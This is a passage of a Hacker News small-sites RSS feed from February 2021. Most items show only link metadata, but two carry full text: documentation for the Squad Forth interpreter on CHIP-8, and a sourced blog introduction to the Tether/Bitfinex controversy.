February 18, 2021 | https://www.anjuna.io/amazon-nitro-enclaves | <a href="https://web.archive.org/web/*/https://www.anjuna.io/amazon-nitro-enclaves">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.anjuna.io/amazon-nitro-enclaves</link>
            <guid isPermaLink="false">hacker-news-small-sites-26189898</guid>
            <pubDate>Fri, 19 Feb 2021 04:52:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LED Characterization]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26189817">thread link</a>) | @parsecs
<br/>
February 18, 2021 | https://blog.jaseg.de/posts/led-characterization/ | <a href="https://web.archive.org/web/*/https://blog.jaseg.de/posts/led-characterization/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://blog.jaseg.de/posts/led-characterization/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26189817</guid>
            <pubDate>Fri, 19 Feb 2021 04:38:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All in Good Time]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26189084">thread link</a>) | @oftenwrong
<br/>
February 18, 2021 | https://www.granolashotgun.com/granolashotguncom/easy-to-design-hard-to-build | <a href="https://web.archive.org/web/*/https://www.granolashotgun.com/granolashotguncom/easy-to-design-hard-to-build">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://www.granolashotgun.com/granolashotguncom/easy-to-design-hard-to-build</link>
            <guid isPermaLink="false">hacker-news-small-sites-26189084</guid>
            <pubDate>Fri, 19 Feb 2021 03:00:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Object Detection at 2530 FPS with TorchScript, TensorRT, and 8-Bit Quantization]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26189046">thread link</a>) | @cwaffles
<br/>
February 18, 2021 | https://paulbridger.com/posts/tensorrt-object-detection-quantized/ | <a href="https://web.archive.org/web/*/https://paulbridger.com/posts/tensorrt-object-detection-quantized/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://paulbridger.com/posts/tensorrt-object-detection-quantized/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26189046</guid>
            <pubDate>Fri, 19 Feb 2021 02:55:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[12 requests per second: A realistic look at Python web frameworks]]>
            </title>
            <description>
<![CDATA[
Score 473 | Comments 227 (<a href="https://news.ycombinator.com/item?id=26188765">thread link</a>) | @gilad
<br/>
February 18, 2021 | https://suade.org/dev/12-requests-per-second-with-python/ | <a href="https://web.archive.org/web/*/https://suade.org/dev/12-requests-per-second-with-python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://suade.org/dev/12-requests-per-second-with-python/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26188765</guid>
            <pubDate>Fri, 19 Feb 2021 02:21:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dismantling Racism in Mathematics Instruction [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26188717">thread link</a>) | @kofejnik
<br/>
February 18, 2021 | https://equitablemath.org/wp-content/uploads/sites/2/2020/11/1_STRIDE1.pdf | <a href="https://web.archive.org/web/*/https://equitablemath.org/wp-content/uploads/sites/2/2020/11/1_STRIDE1.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://equitablemath.org/wp-content/uploads/sites/2/2020/11/1_STRIDE1.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26188717</guid>
            <pubDate>Fri, 19 Feb 2021 02:15:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automate deleting old Google emails and calendar events]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26188686">thread link</a>) | @SUPERCILEX
<br/>
February 18, 2021 | https://alexsaveau.dev/blog/tips/privacy/automation/automate-deleting-old-google-emails-and-calendar-events | <a href="https://web.archive.org/web/*/https://alexsaveau.dev/blog/tips/privacy/automation/automate-deleting-old-google-emails-and-calendar-events">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://alexsaveau.dev/blog/tips/privacy/automation/automate-deleting-old-google-emails-and-calendar-events</link>
            <guid isPermaLink="false">hacker-news-small-sites-26188686</guid>
            <pubDate>Fri, 19 Feb 2021 02:11:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[5-MeO-DMT: The Story Behind the '‚ÄúGod Molecule‚Äù (2020)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26188612">thread link</a>) | @mardiyah
<br/>
February 18, 2021 | https://doubleblindmag.com/5-meo-dmt-the-story-behind-the-god-molecule/ | <a href="https://web.archive.org/web/*/https://doubleblindmag.com/5-meo-dmt-the-story-behind-the-god-molecule/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://doubleblindmag.com/5-meo-dmt-the-story-behind-the-god-molecule/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26188612</guid>
            <pubDate>Fri, 19 Feb 2021 02:03:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Squad: Forth on Chip-8]]>
            </title>
            <description>
<![CDATA[
Score 69 | Comments 8 (<a href="https://news.ycombinator.com/item?id=26188165">thread link</a>) | @RodgerTheGreat
<br/>
February 18, 2021 | https://internet-janitor.itch.io/squad | <a href="https://web.archive.org/web/*/https://internet-janitor.itch.io/squad">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Squad</h2>
<p>Squad is a <a href="https://en.wikipedia.org/wiki/Forth_(programming_language)" rel="nofollow noopener">Forth</a> interpreter that runs on the <a href="https://en.wikipedia.org/wiki/CHIP-8" rel="nofollow noopener">SCHIP</a> virtual machine. It extends the 8-bit operations of this host machine to 16 bit "cells", per tradition, which also allows pointers to be easily transported and manipulated on the stacks. The parameter and return stacks have room for 32 cells apiece, and at startup there is a bit over 1kb of free space available for user definitions.</p>
<p>While many niceties are missing from the built-in lexicon, due to space constraints, Squad is a fairly complete Forth environment, with a conventional outer and inner interpreter, immediate words, and a mutable return stack.&nbsp;Squad's functionality compares favorably to&nbsp;<a href="https://github.com/JohnEarnest/chip8Archive/blob/master/src/applejak" rel="nofollow noopener"></a><a href="https://internet-janitor.itch.io/applejak">Applejak</a>&nbsp;and&nbsp;<a href="https://internet-janitor.itch.io/bulb">Bulb</a>.</p>
<p>Dictionary entries consist of a pointer to the previous entry (or 0 for the root entry), a "type" cell (see "&gt;type") which distinguishes immediate words with its high byte and word classes with its low byte, the name of the word as a string (see "&gt;name"), and the body of the word itself (see "&gt;body"). Strings are represented with a custom encoding in which each character is a byte, and strings are null-terminated by the byte 0xFF. Properly-formed characters should be multiples of 5, and represent indices into the following alphabet:</p>
<pre>0123456789abcdefghijklmnopqrstuvwxyz+-&lt;&gt;=!@.,:;[]
</pre>
<p>Source code and other materials are also available on <a href="https://github.com/JohnEarnest/chip8Archive/tree/master/src/squad" rel="nofollow noopener">the CHIP-8 Archive</a>.</p>
<h2>Controls</h2>
<p>The ASWD keys and E are always interchangeable with the arrow keys and space.</p>
<p>The outer interpreter will prompt the user for a token at a time, and then either append it to the current definition or execute it, based on "mode". Whenever text is drawn with an inverted background, it is a pending input. Pressing right-arrow or space will confirm a selection, while the up and down arrows cycle between available options.</p>
<p>First, the outer interpreter will ask the user to choose between several coarse categories- a number ("num"), or one of six categories of word, described in detail below. Numbers are always shown in 16-bit hexadecimal. The up and down arrows will increment or decrement the number, while 2 and X will increment or decrement the the number by 256 at a time, to ease entering pointers and large values. If the user is ever prompted to enter a previously unused word name (see "name"), the entry can be terminated by choosing a space character (which will confirm the name up to but not including the space), or by pressing space (which will confirm the name up to and including the present pending character). Pressing Q while entering a new name will back up one character.</p>
<p>At the top level of the outer interpreter, the user may also press `Z`, which is a shorthand for entering ".s"; it will print the current contents of the parameter stack on a new line without modifying it.</p>
<h2>Simple Examples</h2>
<p>Bump allocator:</p>
<pre>: allot here @ + here ! ;</pre>
<p>Calculate and print some terms of the Fibonacci sequence imperatively:</p>
<pre>: fib  0 1 loop dup . swap over + dup 100 &gt; until ;</pre>
<h2>Vocabulary</h2>
<p>The following word lists include stack effects in parentheses. The names to the left of the "--" sign are the input arguments, bottom to top,&nbsp;and the names to the right are the results, if any, bottom to top.</p>
<h3>IO</h3>
<p>Input and output words. Type code 1.</p>
<ul><li>emit ( char -- ) print a single character to the terminal. The high byte of "char" is ignored.</li><li>space ( -- ) print a space to the terminal.</li><li>cr ( -- ) advance terminal output to a new line.</li><li>erase ( -- ) un-print a single character from the current line of terminal output.</li><li>type ( str -- ) given a string (as described above), print it to the terminal.</li><li>untype ( str -- ) erase a string, by issuing "erase" for each character.</li><li>num ( -- n ) prompt the user to enter a 16-bit number.</li><li>name ( -- ) prompt the user to enter a string for a new word name, appending this string to "here".</li><li>word ( type -- xt ) prompt the user to select the name of an existing word. If "type" is 0, any word. Otherwise, it should be the type code of one of these categories.</li><li>token ( -- x flag ) prompt the user for a token, as in the outer interpreter. If "flag" is 0, "x" is a number. Otherwise it's a dictionary entry ("xt").</li></ul>
<h3>Core</h3>
<p>Fundamental forth primitives. Type code 2.</p>
<ul><li>dup ( x -- x x ) copy the top of the parameter stack.</li><li>drop ( x -- ) discard the top of the parameter stack.</li><li>over ( x y -- x y x ) copy the second item on the parameter stack.</li><li>swap ( x y -- y x ) exchange the top two items on the parameter stack.</li><li>r&gt; ( | x -- x | ) move an item from the parameter stack to the return stack.</li><li>&gt;r ( x | -- | x ) move an item from the return stack to the parameter stack.</li><li>! ( x addr -- ) write a 16-bit value x to "addr".</li><li>c! ( x addr -- ) write an 8-bit value (the low byte of x) to "addr".</li><li>@ ( addr -- x ) read a 16-bit value from addr.</li><li>c@ ( addr -- x ) read an 8-bit value from addr.</li><li>not ( x -- flag ) logically invert the flag x.</li><li>&gt; ( x y -- flag ) is x greater than y?</li><li>&lt; ( x y -- flag ) is x less than y?</li><li>= ( x y -- flag ) is x equal to y?</li><li>xor ( x y -- z ) bitwise XOR of x and y.</li><li>and ( x y -- z ) bitwise AND of x and y.</li><li>or ( x y -- z ) bitwise OR of x and y.</li><li>- ( x y -- z ) difference of x and y.</li><li>+ ( x y -- z ) sum of x and y.</li></ul>
<h3>Mem</h3>
<p>Words concerning working with memory and dictionary entries. Type code 3.</p>
<ul><li>here ( -- addr ) a variable containing the address of the first available cell of memory.</li><li>head ( -- addr ) a variable containing the xt of the most recent dictionary entry.</li><li>mode ( -- addr ) a variable containing 0 during interpretation or 1 during compilation.</li><li>, ( x -- ) write a cell to here, incrementing here by 2.</li><li>,c ( x -- ) write a byte to here, incrementing here by 1.</li><li>,ret ( -- ) append an exit to the current definition. This word performs tail-call elimination if the exit follows a threaded code subroutine call.</li><li>,lit ( x -- ) append a literal (push a number) to the current definition.</li><li>,jump ( addr -- ) append an unconditional branch to threaded code at addr to the current definition.</li><li>,jump0 ( addr -- ) append a conditional branch (branch if top of parameter stack is 0) to threaded code at addr to the current definition.</li><li>,call ( xt -- ) append a subroutine call to the current definition. This word will do the right thing whether the provided xt is a "native" (built-in) or threaded code subroutine.</li><li>&gt;type ( xt -- n ) given a dictionary entry, get its category. High byte is the immediate flag, low byte is the category type code.</li><li>&gt;name ( xt -- str ) given a dictionary entry, get the address of its name (suitable for "type").</li><li>&gt;body ( xt -- addr ) given a dictionary entry, get the address where its body begins.</li><li>create ( -- ) prompt for a name, and create a new dictionary entry with that name.</li><li>exec ( xt -- ) given a dictionary entry, execute the word. interpretation counterpart to ",call".</li></ul>
<h3>Flow</h3>
<p>Immediate words, mostly for dealing with control flow and compilation state. Type code 4.</p>
<ul><li>if ... (else) ... then: basic conditional control structure. if consumes a boolean flag.</li><li>loop ... (again | until | while): basic infinite and conditional loops. until and while consume a boolean flag.</li><li>:imm ( -- )&nbsp;prompt for a new name, and then begin defining an immediate word. Counterpart to ":".</li><li>: &nbsp;( -- )&nbsp;prompt for a new name, and then begin defining an ordinary word.</li><li>; &nbsp;( -- )&nbsp;terminate a word and stop compiling.</li><li>exit ( -- )&nbsp;early return from a word; do not stop compiling.</li><li>[ &nbsp;&nbsp;( -- )&nbsp;switch to interpreting. Use with "]" and ",lit" to pre-evaluate constant expressions, for example.</li><li>] ( --&nbsp;)&nbsp;switch to compiling.</li></ul>
<h3>Env</h3>
<p>Helper words for maintaining and inspecting the Forth environment. Type code 5.</p>
<ul><li>free ( -- x ) how many bytes of memory are available?</li><li>forget ( -- ) prompt for a word name, and destroy that dictionary entry as well as all later definitions. This can really donk up your interpreter if you apply it to internal bits of Squad.</li><li>.s ( -- ) display the contents of the parameter stack without altering it.</li><li>words ( -- ) list all available words.</li></ul>
<h3>User</h3>
<p>"User-defined" (non-primitive) words. Type code 6.</p>
<pre>:    1+     1 +    ; ( x -- y )
:imm quote  0 word ; ( -- xt )</pre>
</div></div>]]>
            </description>
            <link>https://internet-janitor.itch.io/squad</link>
            <guid isPermaLink="false">hacker-news-small-sites-26188165</guid>
            <pubDate>Fri, 19 Feb 2021 01:06:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to the Tether/Bitfinex Controversy]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26188084">thread link</a>) | @morpheos137
<br/>
February 18, 2021 | https://bennettftomlin.com/2020/12/08/an-introduction-to-the-tether-bitfinex-controversy/ | <a href="https://web.archive.org/web/*/https://bennettftomlin.com/2020/12/08/an-introduction-to-the-tether-bitfinex-controversy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Bitfinex is one of the historically largest Bitcoin exchanges and Tether is by far the largest stablecoin.  Each potentially has significant influence over the industry on their own, and their interconnectedness makes this more of a concern.  However, since both were founded years ago and many of the events have happened and been in revealed in bits and spurts it can be difficult to understand their place in the cryptocurrency environment.  This will hopefully serve as a basic introductory document that will then prompt further research.</p>



<p>Bitfinex was founded by Raphael Nicolle, a <a href="https://www.linkedin.com/in/raphaelnicolle/?locale=en_US">helpdesk</a> technician(<a href="https://bennettftomlin.files.wordpress.com/2020/12/screen-shot-2020-12-08-at-6.31.10-pm.png">best I can do for an archive is a screenshot</a>), in 2012.  It quickly grew in popularity in part due to its ability to serve as a meta-exchange where you could trade on Bitfinex, Mt. Gox, or Bitstamp from the same interface, and later their lending features.  However, even from the founding there were issues that plagued Bitfinex.  Not the least of which being that the<a href="https://news.bitcoin.com/new-details-emerge-bitfinexs-history-amid-hacking-probe/"> source code for Bitfinex was stolen from Bitcoinica</a> (<a href="https://web.archive.org/web/20201209003651/https://news.bitcoin.com/new-details-emerge-bitfinexs-history-amid-hacking-probe/">archive</a>), an earlier hacked and failed exchange created by a 17 year old.  Furthermore, the nature of the meta-exchange meant that they also frequently had large amounts of funds on other exchanges including Mt. Gox. As late as April 21st of 2013 you can see in the leaked email below that they had half of their funds on Mt. Gox.  Mt. Gox was famously hacked for three years and had approximately 650,000 Bitcoin stolen, culminating in ending withdrawals on <a href="https://www.bloomberg.com/news/articles/2014-02-07/bitcoin-price-falls-as-mt-gox-exchange-halts-activity">February 24, 2014</a> (<a href="https://web.archive.org/web/20200806060624/https://www.bloomberg.com/news/articles/2014-02-07/bitcoin-price-falls-as-mt-gox-exchange-halts-activity">archive</a>).  It is unknown if Bitfinex had funds on Mt. Gox when it became impossible to withdraw.</p>



<figure><img src="https://web.archive.org/web/20201209003651im_/https://news.bitcoin.com/wp-content/uploads/2016/09/bitfinex-gox-email.jpg" alt="bitfinex-gox-email"><figcaption><a href="https://news.bitcoin.com/new-details-emerge-bitfinexs-history-amid-hacking-probe/">https://news.bitcoin.com/new-details-emerge-bitfinexs-history-amid-hacking-probe/</a></figcaption></figure>



<p>The early history of Tether is complicated.  The precursor to Tether, RealCoin was started in <a href="https://blogs.wsj.com/moneybeat/2014/07/08/dollar-backed-digital-currency-aims-to-fix-bitcoins-volatility-dilemma/">July</a> (<a href="https://web.archive.org/web/20170928084624/https://blogs.wsj.com/moneybeat/2014/07/08/dollar-backed-digital-currency-aims-to-fix-bitcoins-volatility-dilemma/">archive</a>) of 2014 by Brock Pierce (who was <a href="https://www.latimes.com/archives/la-xpm-2002-may-18-me-den18-story.html">arrested in Spain with a fugitive child sexual offender</a> (<a href="https://web.archive.org/web/20201209010719/https://www.latimes.com/archives/la-xpm-2002-may-18-me-den18-story.html">archive</a>)[released with no charges] and was once <a href="https://www.rollingstone.com/culture/culture-features/brock-pierce-hippie-king-of-cryptocurrency-700213/">sued for child sexual abuse</a> [he was voluntarily dismissed of all charges])(<a href="https://bennettftomlin.com/2020/11/06/the-time-brock-pierce-dmed-me/">who once DMed me</a>), Reeve Collins, and Craig Sellars. It was going to be the first dollar backed stablecoin, where each token on the blockchain would represent a dollar in the bank.  This was possible thanks to a new protocol built on top of Bitcoin called Omni that allowed for these tokens to be minted easily.  On September 5th 2014 <a href="https://offshoreleaks.icij.org/nodes/82024464">Tether Holdings Limited</a> (<a href="https://web.archive.org/web/20201209011637/https://offshoreleaks.icij.org/nodes/82024464">archive</a>) was founded by Phil Potter (CSO of Bitfinex at the time) and Giancarlo Devasini (CFO of Bitfinex)[<a href="http://www1.adnkronos.com/Archivio/AdnAgenzia/1996/12/03/Cronaca/PIRATI-INFORMATICI-MICROSOFT-AL-CONTRATTACCO_130900.php">once ordered to pay 100 Million Italian Lira to Microsoft over his sale of pirated software</a>(<a href="https://web.archive.org/web/20201209023901/http://www1.adnkronos.com/Archivio/AdnAgenzia/1996/12/03/Cronaca/PIRATI-INFORMATICI-MICROSOFT-AL-CONTRATTACCO_130900.php">archive</a>)]. On <a href="https://omniexplorer.info/tx/ce36efda15bc6cf99ba6a010e71b47b00a5ea2071a392839effe7ed392cf690f">October 6th 2014</a> (<a href="https://web.archive.org/web/20201209012443/https://omniexplorer.info/tx/ce36efda15bc6cf99ba6a010e71b47b00a5ea2071a392839effe7ed392cf690f">archive</a>) [Bitcoin/Omni transaction id: ce36efda15bc6cf99ba6a010e71b47b00a5ea2071a392839effe7ed392cf690f] the very first Tether tokens were minted.  At some point during this process Tether and Bitfinex ended up having the same leadership team and the same ownership (though they would deny this fact for a while).  <strong>UPDATE: ADDITIONAL CONTEXT ON THIS CLAIM <a href="https://twitter.com/BennettTomlin/status/1362520823681187847">HERE</a></strong></p>



<p>Bitfinex was <a href="https://www.bbc.com/news/technology-37009319">first hacked in May 2015</a> (<a href="https://web.archive.org/web/20201209020249/https://www.bbc.com/news/technology-37009319">archive</a>).  It was just 1500 Bitcoins from their hot wallet and they covered it out of their corporate funds. This did little to affect the general confidence in Bitfinex and it retained its position as one of the largest exchanges.  Bitfinex‚Äôs position became more complicated when in June of 2016 the CFTC ordered Bitfinex to pay a $75,000 fine for ‚Äú<a href="https://web.archive.org/web/20180620074228/https://www.cftc.gov/PressRoom/PressReleases/pr7380-16">offering illegal off-exchange financed retail commodity transactions in bitcoin and other cryptocurrencies</a>‚Äú.  Part of the issue was that the Bitcoins were not ‚Äúphysically delivered‚Äù from the perspective of the CFTC.  This may have been a motivating factor for Bitfinex‚Äôs switchover to BitGo for their wallet security.  <a href="https://www.coindesk.com/bitfinex-bitcoin-hack-know-dont-know">BitGo would have allowed for them to segregate each user‚Äôs balance</a> (<a href="https://web.archive.org/web/20201209022839/https://www.coindesk.com/bitfinex-bitcoin-hack-know-dont-know">archive</a>).  It was also supposed to provide them with significantly improved multi-signature security.  Then they were hacked again in August 2016.  This was one of the largest Bitcoin hacks of all time totally 119,756 BTC.  In response to this hack, Bitfinex gave the majority of their clients a 30.67% haircut (at least one customer was excluded, <a href="https://twitter.com/nathanielpopper/status/933130228175552513">Coinbase</a>[<a href="https://web.archive.org/web/20201209023544/https://twitter.com/nathanielpopper/status/933130228175552513">archive</a>]).  They credited each customer with a BFX token that represented $1 of the haircut.  They said they would pay back all BFX tokens eventually or would offer equity in exchange for them.  Bitfinex promised to provide a security audit and a <a href="https://www.bitfinex.com/posts/135">financial audit</a> (<a href="https://web.archive.org/web/20201209024343/https://www.bitfinex.com/posts/135">archive</a>).  They did not.  Many of these BFX tokens were converted to equity in Bitfinex, and these users became passionate advocates for Bitfinex.  Eventually all tokens were paid off or converted.</p>



<p>Tether was hacked once as well.  In November 2017, <a href="https://tether.to/tether-critical-announcement/">$30,950,010</a> (<a href="https://web.archive.org/web/20201209025631/https://tether.to/tether-critical-announcement/">archive</a>) Tethers were removed from their wallet.  In order to respond to this Tether <a href="https://twitter.com/dexx7y/status/1046999405449162752">forced</a> (<a href="https://archive.li/ow1WR">archive</a>) a hard fork of the Omni Protocol to mark those Tethers as no longer valid. Eventually Omni added a feature that allowed for transactions to be frozen by the issuer, an ability that Tether maintains to this day.</p>



<p>One of the most commonly voiced frustrations with Tether is that they have never provided a true and full financial audit to prove that they were backed. Tether for years promised that they would get an audit and have yet to follow through.  Early on in their history they did have attestations from a Taiwanese accounting firm [<a href="https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20161231.pdf">12/16</a> (<a href="https://web.archive.org/web/20180608165825/https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20161231.pdf">archive</a>), <a href="https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170131.pdf">1/17</a> (<a href="https://web.archive.org/web/20180608165847/https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170131.pdf">archive</a>), <a href="https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170228.pdf">2/17</a> (<a href="https://web.archive.org/web/20201209030804/https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170228.pdf">archive</a>), and <a href="https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170331.pdf">3/17</a> (<a href="https://web.archive.org/web/20201209030842/https://tether.to/wp-content/uploads/2017/09/Tether-Ltd-20170331.pdf">archive</a>)].  Due to banking difficulties in Taiwan (we will get back to this) they stopped this relationship.  They then hired Friedman LLP in New York for promised <a href="https://tether.to/tether-update/">‚Äúcomprehensive balance sheet audits on a quarterly basis going back to Dec. 31, 2016. We will share those results with you as they become available in the coming weeks or month.‚Äù</a> (<a href="https://web.archive.org/web/20201209031130/https://tether.to/tether-update/">Archive</a>)  This audit (like the promised Bitfinex audit) never arrived.  Tether said the following in response to this relationship ending, <a href="https://www.coindesk.com/tether-confirms-relationship-auditor-dissolved">‚ÄúWe confirm that the relationship with Friedman is dissolved.&nbsp;&nbsp;Given the excruciatingly detailed procedures Friedman was undertaking for the relatively simple balance sheet of Tether, it became clear that an audit would be unattainable in a reasonable time frame.‚Äù</a> (<a href="https://web.archive.org/web/20201209031423/https://www.coindesk.com/tether-confirms-relationship-auditor-dissolved">Archive</a>)  Tether did release a memo from Friedman that was explicitly <a href="https://tether.to/wp-content/uploads/2017/09/Final-Tether-Consulting-Report-9-15-17_Redacted.pdf?__cf_chl_jschl_tk__=0373e80d4605b2403e4fa9ad178b59f58332e003-1607482972-0-AXwPytlF2ASiAPHNVyFGCJ0LzggZ5e42AZzl1D1SgWRpnkY3Ax7fbGPzlbHbkcNqXlTurC1OX3n-4RAq6wIpqdl0eKH4mhd2XryfOODH6hYHAEygAyoYCFwNnw0PQdoSSGxzNDi6a1wr2IRskMsIXd6BawH5IUiokknVrvtKZtm4_BqD1b70YalyCuPuQJurkzAyjO3gbqEb3jsNVNZFXsxVfpwS969ys3dk1W4smwOqEIwiMMGtLYnf0EobcSdMD-RVj2geKymVBJP-oG3p5jgRVhwRK0Zer7itaokNKEhTheoEW3Yji_10RKZF4Qfq2Lm4AgOQsE1KjhoIif5LNU2F4-HmHG6WZqm10j2PSLFToE836a11X9Yx7AdZXyZ_4nYW5lylIJsvldUgvq3wQsMFrZ152DHaH5n6FKEjzrlH">not meant to be relied upon</a>. (<a href="https://web.archive.org/web/20201209031607/https://tether.to/wp-content/uploads/2017/09/Final-Tether-Consulting-Report-9-15-17_Redacted.pdf?__cf_chl_jschl_tk__=0373e80d4605b2403e4fa9ad178b59f58332e003-1607482972-0-AXwPytlF2ASiAPHNVyFGCJ0LzggZ5e42AZzl1D1SgWRpnkY3Ax7fbGPzlbHbkcNqXlTurC1OX3n-4RAq6wIpqdl0eKH4mhd2XryfOODH6hYHAEygAyoYCFwNnw0PQdoSSGxzNDi6a1wr2IRskMsIXd6BawH5IUiokknVrvtKZtm4_BqD1b70YalyCuPuQJurkzAyjO3gbqEb3jsNVNZFXsxVfpwS969ys3dk1W4smwOqEIwiMMGtLYnf0EobcSdMD-RVj2geKymVBJP-oG3p5jgRVhwRK0Zer7itaokNKEhTheoEW3Yji_10RKZF4Qfq2Lm4AgOQsE1KjhoIif5LNU2F4-HmHG6WZqm10j2PSLFToE836a11X9Yx7AdZXyZ_4nYW5lylIJsvldUgvq3wQsMFrZ152DHaH5n6FKEjzrlH">Archive</a>) This was for cash balances as of September 2017.  The next update (which was still not an audit) came not from an accounting firm, but from a law firm.  Tether engaged Freesh, Sporkin, and Sullivan LLP to review their bank accounts and provide a letter saying that the number of dollars in the bank was greater than the number of <a href="https://tether.to/wp-content/uploads/2018/06/FSS1JUN18-Account-Snapshot-Statement-final-15JUN18.pdf">Tethers in circulation</a> (<a href="https://web.archive.org/web/20201209032159/https://tether.to/wp-content/uploads/2018/06/FSS1JUN18-Account-Snapshot-Statement-final-15JUN18.pdf">archive</a>).  It is important to note that again this document does not seem to have been meant for public release.  Since this update there has been no more review of Tether‚Äôs backing (we‚Äôll come back to this).</p>



<p>Against this backdrop both Bitfinex and Tether struggled with their banking.  This started in April 2017 when Wells Fargo, the correspondent bank for Tether and Bitfinex‚Äôs Taiwanese banks, cut off their withdrawals.  Since then Bitfinex and Tether have jumped from bank to bank.  They briefly banked at Noble Bank International an international financial entity that was founded by Brock Pierce and John Betts (an investor most noted for trying to buyout Mt Gox).  After Noble faced financial difficulties Tether landed at Deltec bank.  </p>



<p>Due to Bitfinex‚Äôs difficulties in securing and maintaining banking they partnered with <a href="https://bennettftomlin.com/2020/11/07/a-list-of-companies-who-worked-with-crypto-capital/">Crypto Capital Corp</a>.  Crypto Capital Corp was run by <a href="https://www.justice.gov/usao-sdny/pr/arizona-man-and-israeli-woman-charged-connection-providing-shadow-banking-services">Reggie Fowler and Ravid Yosef</a> (<a href="https://web.archive.org/web/20201209033930/https://www.justice.gov/usao-sdny/pr/arizona-man-and-israeli-woman-charged-connection-providing-shadow-banking-services">archive</a>).  Reggie Fowler has been arrested on bank fraud charges, and Ravid Yosef is still on the run.  </p>



<p>Shortly before the news broke about the charges and arrest of Reggie Fowler the New York Attorney General revealed that they were investigating Tether and Bitfinex for <a href="https://iapps.courts.state.ny.us/fbem/DocumentDisplayServlet?documentId=vIexA1b0spKOnK_PLUS_ZUGTJ3A==&amp;system=prod">fraud</a> (<a href="https://web.archive.org/web/20201209034305/https://iapps.courts.state.ny.us/fbem/DocumentDisplayServlet?documentId=vIexA1b0spKOnK_PLUS_ZUGTJ3A%3D%3D&amp;system=prod">archive</a>).  Several shocking details were revealed in this investigation (some of which I have covered <a href="https://bennettftomlin.com/2020/02/13/analysis-of-december-nyag-and-tether-filings/">here</a>, <a href="https://bennettftomlin.com/2019/05/21/key-excerpts-and-commentary-from-nyag-tether-court-transcript/">here</a>, <a href="https://bennettftomlin.com/2020/12/06/analysis-of-the-new-york-supreme-court-remittitur-in-the-tether-and-bitfinex-new-york-attorney-general-case/">here</a>), including that Bitfinex had given $1 bn to Crypto Capital and had not even signed a contract.  When Crypto Capital stopped serving Bitfinex‚Äôs withdrawal requests (which Bitfinex actively was lying about), Bitfinex exchanged $625 mn of their ‚Äòbook‚Äô dollars in Crypto Capital for money that Tether had in their bank account in order to service withdrawals.  This in effect made Tether insolvent.  This happened before Tether changed their promise from fully backed by cash. After this Bitfinex entered into a credit agreement with Tether wherein Tether extended a loan of up to $900mn to Bitfinex.  The loan was secured by iFinex shares which were owned by Digfinex the parent company for both Tether and Bitfinex.  The NYAG report includes the following line, ‚ÄúThe transaction documents were signed on behalf of Bitfinex and Tether by the same two individuals.  Those two individuals are also directors and owners of Digfinex, Bitfinex and Tether.‚Äù  (See the postscript for some other things that were discovered when the NYAG released the order.)</p>



<p>When news of this effective insolvency broke, Bitfinex responded by creating a new token called <a href="https://www.bitfinex.com/wp-2019-05.pdf">UNUS SED LEO</a> (<a href="https://web.archive.org/web/20201209040248/https://www.bitfinex.com/wp-2019-05.pdf">archive</a>) or Leo from here on out.  They intended to sell 1 billion tokens, each for a dollar, in order to help close out the loan facility. (All tokens were sold but the loan facility has not been paid off.)  The token provided some discounts on Bitfinex‚Äôs platform to it‚Äôs holder.  However, most of its potential value derviced from the other promises they made including that they would buy back an amount of LEO equal to 27% of their (unaudited) revenue each month, or their promise to use 95% of the net recovered funds from Crypto Capital to buy and burn LEO.  </p>



<p>Since then Tether‚Äôs size has absolutely exploded with it growing to nearly $20,000,000,000.  Bitfinex and Tether are still under investigation by the NYAG, but have had their appeal rejected and they will be moving to <a href="https://bennettftomlin.com/2020/12/06/analysis-of-the-new-york-supreme-court-remittitur-in-the-tether-and-bitfinex-new-york-attorney-general-case/">trial soon</a>.</p>



